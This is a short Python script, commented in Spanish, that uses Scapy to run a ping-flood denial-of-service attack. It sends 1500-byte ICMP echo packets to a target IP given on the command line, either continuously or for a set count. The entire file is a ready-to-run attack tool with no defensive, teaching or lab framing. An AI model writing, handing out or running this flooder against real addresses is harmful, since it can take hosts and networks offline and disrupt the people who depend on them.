#!/usr/bin/env python3

from scapy.all import IP, ICMP, send
import argparse
import time

def ping_flood(target_ip, packet_size=1500, count=0):
    """
    Realiza un ataque de ping flood contra una IP objetivo.

    :param target_ip: Dirección IP del objetivo.
    :param packet_size: Tamaño de los paquetes ICMP en bytes (por defecto 1500).
    :param count: Número de paquetes a enviar. 0 para envío continuo (por defecto 0).
    """
    print(f"Iniciando ataque de Ping Flood contra {target_ip}...")
    print(f"Tamaño del paquete: {packet_size} bytes")
    if count == 0:
        print("Modo: Continuo (Ctrl+C para detener)")
    else:
        print(f"Número de paquetes a enviar: {count}")

    packet = IP(dst=target_ip)/ICMP(type=8, code=0)/('X' * packet_size)
    sent_packets = 0

    try:
        if count == 0:
            while True:
                send(packet, verbose=0)
                sent_packets += 1
                if sent_packets % 100 == 0: # Imprimir progreso cada 100 paquetes
                    print(f"Paquetes enviados: {sent_packets}", end='\r')
                time.sleep(0.001) # Pequeña pausa para evitar sobrecargar la propia máquina
        else:
            for _ in range(count):
                send(packet, verbose=0)
                sent_packets += 1
                if sent_packets % 100 == 0:
                    print(f"Paquetes enviados: {sent_packets}", end='\r')
                time.sleep(0.001)
    except KeyboardInterrupt:
        print("\nAtaque de Ping Flood detenido por el usuario.")
    except Exception as e:
        print(f"\nOcurrió un error: {e}")
    finally:
        print(f"\nTotal de paquetes enviados: {sent_packets}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Herramienta de Ping Flood DoS.")
    parser.add_argument("target_ip", help="Dirección IP del objetivo.")
    parser.add_argument("-s", "--size", type=int, default=1500, help="Tamaño de los paquetes ICMP en bytes (por defecto: 1500).")
    parser.add_argument("-c", "--count", type=int, default=0, help="Número de paquetes a enviar. 0 para envío continuo (por defecto: 0).")

    args = parser.parse_args()

    ping_flood(args.target_ip, args.size, args.count)


